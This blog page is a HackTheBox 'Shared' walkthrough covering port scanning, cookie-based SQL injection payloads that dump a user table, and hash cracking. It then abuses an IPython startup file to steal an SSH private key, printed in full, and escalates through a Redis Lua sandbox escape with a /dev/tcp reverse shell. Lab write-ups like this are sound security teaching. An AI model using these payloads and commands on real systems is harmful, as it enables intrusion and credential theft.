@@ -1,0 +1,374 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Shared</title><meta name="description" content="This is a blog created by ischyrós"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/faviconn.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Information GatheringNMAP
+command used: ( scanning for all the ports fast and efficient)
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.172 -oG nmap/allPorts
+
+
+command used: ( scanning the ports we got )
+nmap -A -sC -sV -p22,80,443 10.10.11.172 -Pn
+
+
+
+-&amp;gt; All ports scan:
+Not shown: 65518 closed tcp ports (reset), 14 filtered tcp ports (.."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">ischyrós's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Shared</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-22-Default-port-for-SSH"><span class="toc-text">TCP 22 ( Default port for SSH )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-80-Default-port-for-HTTP"><span class="toc-text">TCP 80 ( Default port for HTTP )</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering-Operating-System"><span class="toc-text">Information Gathering ( Operating System )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Information-Gathering"><span class="toc-text">User Information Gathering</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Medium"><i class="tag post-item-tag">Medium</i></a><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Shared</h1><time class="has-text-grey" datetime="2022-10-25T20:11:40.000Z">2022-10-25</time><article class="mt-2 post-content"><img src="/2022/10/25/shared/avatar.png" class="">
+
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><ul>
+<li><p>command used: ( scanning for all the ports fast and efficient)</p>
+<pre><code class="bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.172 -oG nmap/allPorts
+</code></pre>
+</li>
+<li><p>command used: ( scanning the ports we got )</p>
+<pre><code class="bash">nmap -A -sC -sV -p22,80,443 10.10.11.172 -Pn
+</code></pre>
+</li>
+</ul>
+<p>-&gt; All ports scan:</p>
+<pre><code class="bash">Not shown: 65518 closed tcp ports (reset), 14 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+</code></pre>
+<p>-&gt; All ports scan with flags:</p>
+<pre><code class="bash">Nmap scan report for 10.10.11.172
+Host is up (0.046s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
+|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
+|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
+80/tcp  open  http     nginx 1.18.0
+|_http-title: Did not follow redirect to http://shared.htb
+|_http-server-header: nginx/1.18.0
+443/tcp open  ssl/http nginx 1.18.0
+|_http-title: Did not follow redirect to https://shared.htb
+| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
+| Not valid before: 2022-03-20T13:37:14
+|_Not valid after:  2042-03-15T13:37:14
+| tls-nextprotoneg: 
+|   h2
+|_  http/1.1
+|_http-server-header: nginx/1.18.0
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><h6 id="TCP-22-Default-port-for-SSH"><a href="#TCP-22-Default-port-for-SSH" class="headerlink" title="TCP 22 ( Default port for SSH )"></a>TCP 22 ( Default port for SSH )</h6><p>   -&gt; SSH package version - Might be able to find the OS and version.<br>   -&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)<br>    -&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
+<p>-&gt; SSH package version:</p>
+<pre><code class="bash">nc -vn 10.10.11.172 22
+</code></pre>
+<ul>
+<li>output:<pre><code class="bash">└─$ nc -nv 10.10.11.172 22                                           
+(UNKNOWN) [10.10.11.172] 22 (ssh) open
+</code></pre>
+</li>
+</ul>
+<p>-&gt; SSH key fingerprint:</p>
+<pre><code class="bash">ssh root@10.10.11.172
+</code></pre>
+<ul>
+<li>output:<pre><code class="bash">└─$ ssh root@10.10.11.172
+The authenticity of host &#39;10.10.11.172 (10.10.11.172)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</code></pre>
+</li>
+</ul>
+<p>Looking on the <strong>NMAP</strong> scan we can see that it’s redirecting us to <a target="_blank" rel="noopener" href="https://shared.htb/">https://shared.htb</a> so let’s add it on our <strong>/etc/hosts</strong> file.</p>
+<h6 id="TCP-80-Default-port-for-HTTP"><a href="#TCP-80-Default-port-for-HTTP" class="headerlink" title="TCP 80 ( Default port for HTTP )"></a>TCP 80 ( Default port for HTTP )</h6><p>-&gt; Web Server:</p>
+<pre><code class="bash">└─$ curl -i http://shared.htb/
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.18.0
+Date: Tue, 25 Oct 2022 19:00:42 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: no-cache
+Location: https://shared.htb/
+</code></pre>
+<ul>
+<li>when we try to access <a target="_blank" rel="noopener" href="http://shared.htb/">http://shared.htb</a> we can see that we are being redirected to the <strong>HTTPS</strong> server</li>
+<li>following the address location we get:<pre><code class="bash">└─$ curl -i https://shared.htb/ -k         
+HTTP/2 302 
+server: nginx/1.18.0
+date: Tue, 25 Oct 2022 19:02:34 GMT
+content-type: text/html; charset=utf-8
+location: https://shared.htb/index.php
+cache-control: no-cache
+</code></pre>
+</li>
+</ul>
+<p>We can see that the webserver uses <strong>PHP</strong> so maybe the attack vector we will need to use will be something that has a connection with <strong>PHP</strong></p>
+<p>-&gt; WebServer Picture:</p>
+<img src="/2022/10/25/shared/20221025220513.png" class="">
+
+<p>-&gt; wfuzz:</p>
+<pre><code class="bash">└─$ wfuzz -u &#39;https://shared.htb/FUZZ.php&#39; -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 892
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://shared.htb/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000007:   302        0 L      0 W        0 Ch        &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                                                                                                          
+000000014:   403        7 L      9 W        153 Ch      &quot;https://shared.htb/.php&quot;                                                                                                                                                  
+000000001:   302        0 L      0 W        0 Ch        &quot;# directory-list-2.3-medium.txt&quot;                                                                                                                                          
+000000003:   302        0 L      0 W        0 Ch        &quot;# Copyright 2007 James Fisher&quot;                                                                                                                                            
+000000013:   302        0 L      0 W        0 Ch        &quot;#&quot;                                                                                                                                                                        
+000000012:   302        0 L      0 W        0 Ch        &quot;# on at least 2 different hosts&quot;                                                                                                                                          
+000000011:   302        0 L      0 W        0 Ch        &quot;# Priority ordered case-sensitive list, where entries were found&quot;                                                                                                         
+000000015:   200        1494 L   2312 W     56208 Ch    &quot;index&quot;                                                                                                                                                                    
+000000010:   302        0 L      0 W        0 Ch        &quot;#&quot;                                                                                                                                                                        
+000000009:   302        0 L      0 W        0 Ch        &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                                                                                                                      
+000000006:   302        0 L      0 W        0 Ch        &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                                                                                                            
+000000005:   302        0 L      0 W        0 Ch        &quot;# This work is licensed under the Creative Commons&quot;                                                                                                                       
+000000008:   302        0 L      0 W        0 Ch        &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                                                                                                               
+000000002:   302        0 L      0 W        0 Ch        &quot;#&quot;                                                                                                                                                                        
+000000004:   302        0 L      0 W        0 Ch        &quot;#&quot;                                                                                                                                                                        
+000000039:   403        7 L      9 W        153 Ch      &quot;img&quot;                                                                                                                                                                      
+000000164:   403        7 L      9 W        153 Ch      &quot;uploads&quot;                                                                                                                                                                  
+000000366:   403        7 L      9 W        153 Ch      &quot;upload&quot;                                                                                                                                                                   
+000000621:   403        7 L      9 W        153 Ch      &quot;imgs&quot;
+000001026:   401        0 L      2 W        16 Ch       &quot;api&quot;
+</code></pre>
+<p>The only endpoint that looks interesting is the <strong>api</strong> one.<br>But unfortunately if we try to access it we will be prompted with a login page.</p>
+<p>After some manual enumeration we can see that we can add items to a cart.</p>
+<img src="/2022/10/25/shared/20221025221038.png" class="">
+<p>Adding it to cart we can see that we are being redirected to a new location <a target="_blank" rel="noopener" href="https://checkout.shared.htb/">https://checkout.shared.htb/</a><br>So let’s add this too in our <strong>/etc/hosts</strong> file.</p>
+<p>Because we saw that we have one more <strong>vhost</strong> we will try a subdomain enumeration in case there is another subdomain that we need to find.</p>
+<p>-&gt; wfuzz subdomain enumeration:</p>
+<pre><code class="bash">└─$ wfuzz -u https://shared.htb/ -w httparchive_subdomains_2020_11_18.txt -H &#39;Host: FUZZ.shared.htb&#39; --hw 11
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://shared.htb/
+Total requests: 1537976
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000001:   302        0 L      0 W        0 Ch        &quot;www&quot;                                                                                                                                                                      
+000000613:   200        64 L     151 W      3229 Ch     &quot;checkout&quot;
+</code></pre>
+<p>Now we can positively say that there are no more subdomains.<br>This wordlist is from <a target="_blank" rel="noopener" href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p>
+<img src="/2022/10/25/shared/20221025221618.png" class="">
+
+<p>Normally if you are being redirected to a checkout page there would be some sort of payment method that you need to use in order to buy the item(s) you want.</p>
+<img src="/2022/10/25/shared/20221025221830.png" class="">
+<p>If we take a closed look on the button we can see that it’s not doing any sort of post / get request.<br>So there must be something else that we can abuse.<br>Looking at the cookies we ecan see a strange “hash”</p>
+<img src="/2022/10/25/shared/20221025222251.png" class="">
+<p>By using <strong>CyberChef</strong> we can see that it’s just a string <strong>URL Encoded</strong><br>By decoding this we can see the content: <code>&#123;&quot;YCS98E4A&quot;:&quot;1&quot;&#125;</code></p>
+<p>Remember, this server uses <strong>PHP</strong> so we will try a <strong>SQL Injection</strong> in the cookie keeping the format we just decoded.<br>By trying to find the number of rows we can see that we get a successful hit on the 3rd row.</p>
+<img src="/2022/10/25/shared/20221025223243.png" class="">
+<p><strong>Payload</strong>:</p>
+<pre><code class="php">&#123;&quot;1&#39; union select 1,2,3-- -&quot;:&quot;1&quot;&#125;
+</code></pre>
+<p>Now with that information in mind we can try to dump every piece of data we can in order to elevate our privilages.<br>We will dump the <strong>database</strong> name first so we can enumerate it.</p>
+<img src="/2022/10/25/shared/20221025223556.png" class="">
+<pre><code class="php">&#123;&quot;1&#39; union select 1,database(),3-- -&quot;:&quot;1&quot;&#125;
+</code></pre>
+<p>Now we will need to dump the <strong>table_name</strong> &amp; <strong>table_schema</strong>:</p>
+<img src="/2022/10/25/shared/20221025223847.png" class="">
+<pre><code class="php">&#123;&quot;1&#39; union select 1,table_name,table_schema from information_schema.tables where table_schema=&#39;checkout&#39;-- -&quot;:&quot;1&quot;&#125;
+</code></pre>
+<p>Now let’s dump the user’s username &amp; password:</p>
+<pre><code class="php">&#123;&quot;1&#39; union select 1,username,2 from checkout.user-- -&quot;:&quot;1&quot;&#125;
+&#123;&quot;1&#39; union select 1,password,2 from checkout.user-- -&quot;:&quot;1&quot;&#125;
+</code></pre>
+<p>The user is <strong>james_mason</strong> and password is <strong>fc895d4eddc2fc12f995e18c865cf273</strong><br>Using <strong>hash-identifier</strong> against it we can see that it’s most probably to be an <strong>MD5</strong> string.</p>
+<pre><code class="bash">└─$ hash-identifier
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: fc895d4eddc2fc12f995e18c865cf273
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</code></pre>
+<p>So we will put this on <a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a> to quickly crack the password.</p>
+<img src="/2022/10/25/shared/20221025224206.png" class="">
+<p><strong>PASSWORD</strong>: Soleil101</p>
+<p>Now with these credentials we can log in into <strong>SSH</strong></p>
+<pre><code class="bash">james_mason@shared:~$ hostname
+shared
+james_mason@shared:~$ id
+uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
+james_mason@shared:~$ whoami
+james_mason
+</code></pre>
+<p>We can see that we are in a group called <strong>developer</strong> so let’s investigate it.</p>
+<pre><code class="bash">james_mason@shared:~$ find / -group developer 2&gt;/dev/null
+/opt/scripts_review
+</code></pre>
+<p>We can see that we have access to <strong>/opt/scripts_review</strong> but the folder is empty.<br>So there must be a <strong>crontab</strong> or something of this sort running.<br>The system in running <code>Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux</code> so we will download the <strong>x64</strong> bit version of <strong>pspy</strong><br>In this case we will use <strong>pspy</strong>:</p>
+<pre><code class="bash">2022/10/25 15:50:01 CMD: UID=1001 PID=18642  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython 
+2022/10/25 15:50:01 CMD: UID=1001 PID=18643  | /usr/bin/pkill ipython 
+2022/10/25 15:50:01 CMD: UID=1001 PID=18644  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython 
+2022/10/25 15:50:06 CMD: UID=0    PID=18649  | perl -ne s/\((\d+)\)/print &quot; $1&quot;/ge 
+2022/10/25 15:50:06 CMD: UID=0    PID=18648  | /bin/bash /root/c.sh 
+2022/10/25 15:50:06 CMD: UID=0    PID=18647  | /bin/bash /root/c.sh
+</code></pre>
+<p>Using this blog we can easily escalate the privilages: <a target="_blank" rel="noopener" href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></p>
+<pre><code class="bash">mkdir -m 777 profile_default
+mkdir -m 777 profile_default/startup
+echo &quot;import os; os.system(&#39;cat ~/.ssh/id_rsa &gt; /dev/shm/key&#39;)&quot; &gt; profile_default/startup/foo.py
+
+james_mason@shared:/opt/scripts_review$ cat /dev/shm/key 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>With this <strong>id_rsa</strong> key we can log in as <strong>dan_smith</strong> and try to privilege escalate to <strong>root</strong></p>
+<pre><code class="bash">└─$ ssh -i id_rsa dan_smith@10.10.11.172
+Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Oct 25 15:47:24 2022 from 10.10.14.139
+dan_smith@shared:~$
+</code></pre>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="Information-Gathering-Operating-System"><a href="#Information-Gathering-Operating-System" class="headerlink" title="Information Gathering ( Operating System )"></a>Information Gathering ( Operating System )</h3><pre><code class="bash">dan_smith@shared:~$ cat /etc/*-release
+PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;
+NAME=&quot;Debian GNU/Linux&quot;
+VERSION_ID=&quot;11&quot;
+VERSION=&quot;11 (bullseye)&quot;
+VERSION_CODENAME=bullseye
+ID=debian
+HOME_URL=&quot;https://www.debian.org/&quot;
+SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</code></pre>
+<h3 id="User-Information-Gathering"><a href="#User-Information-Gathering" class="headerlink" title="User Information Gathering"></a>User Information Gathering</h3><pre><code class="bash">dan_smith@shared:~$ id
+uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
+dan_smith@shared:~$ groups
+dan_smith developer sysadmin
+dan_smith@shared:~$ find / -group sysadmin 2&gt;/dev/null
+/usr/local/bin/redis_connector_dev
+dan_smith@shared:~$
+</code></pre>
+<p>We can see again that we are in a strange group called <strong>sysadmin</strong>.<br>So let’s investigate the <strong>redis_connector_dev</strong>:</p>
+<pre><code class="bash">dan_smith@shared:/usr/local/bin$ file redis_connector_dev
+
+redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
+</code></pre>
+<p>We can see that this is a binary so let’s execute it:</p>
+<pre><code class="bash">dan_smith@shared:/usr/local/bin$ /usr/local/bin/redis_connector_dev
+[+] Logging to redis instance using password...
+
+INFO command result:
+# Server
+redis_version:6.0.15
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:4610f4c3acf7fb25
+redis_mode:standalone
+os:Linux 5.10.0-16-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:18862
+run_id:03664ffbd5a89dea04f6577dc3ba064b617ce42a
+tcp_port:6379
+uptime_in_seconds:30
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:5783472
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+&lt;nil&gt;
+</code></pre>
+<p>We can see the port that it’s listening on.<br>So after some research I found out that we could do a sandbox escape according to: <a target="_blank" rel="noopener" href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/">https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/</a><br>So basically what we need to do is to connect via <strong>redis-cli</strong> and do a “sandbox command injection”.<br>But in order to do that we need a password for the <strong>redis-cli</strong><br>So we will download the binary to our machine and try to find it.</p>
+<img src="/2022/10/25/shared/20221025230623.png" class="">
+
+<p>Now that we found the password we can continue with the <strong>sandbox escape</strong></p>
+<pre><code class="bash">echo &quot;bash -i &gt;&amp; /dev/tcp/IP/443 0&gt;&amp;1&quot; &gt; /dev/shm/sh
+redis-cli --pass F2WHqJUz2WEz=Gqq
+
+127.0.0.1:6379&gt; eval &#39;local l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = l(); local f = io.popen(&quot;cat /dev/shm/sh | bash&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0
+</code></pre>
+<p>Now we just need to setup a listener and wait for the reverse shell to pop:</p>
+<pre><code class="bash">└─$ sudo nc -nvlp 443
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.10.14.203] from (UNKNOWN) [10.10.11.172] 41998
+bash: cannot set terminal process group (19157): Inappropriate ioctl for device
+bash: no job control in this shell
+root@shared:/var/lib/redis# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@shared:/var/lib/redis# hostname
+hostname
+shared
+root@shared:/var/lib/redis# cat /root/root.txt
+cat /root/root.txt
+9367676644c0eccee4f882456fdb0fce
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2022/10/20/photobomb/" title="Photobomb"><span class="has-text-weight-semibold">Next: Photobomb</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Copyright © &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="IulianSiPunct" target="_blank" rel="noopener" href="//github.com/Furnicarul">ischyrós&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" 